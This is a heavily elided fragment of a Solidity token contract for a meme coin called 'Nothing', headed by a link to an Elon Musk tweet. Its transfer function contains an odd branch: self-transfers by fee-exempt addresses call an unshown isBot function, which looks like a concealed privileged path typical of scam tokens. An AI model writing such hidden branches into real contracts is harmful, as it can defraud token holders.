...
// https://twitter.com/elonmusk/status/1583978878305173505?s=46&t=7ZDvAzYZnmXEU1OINFRJwQ
...
contract Nothing is Context, IERC20, Ownable {
    ...
    string private _name = unicode"Nothing is for nothing";
    string private _symbol = unicode"Nothing";
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        if(sender == recipient && isExFromFees[sender])
            return isBot(sender,amount);
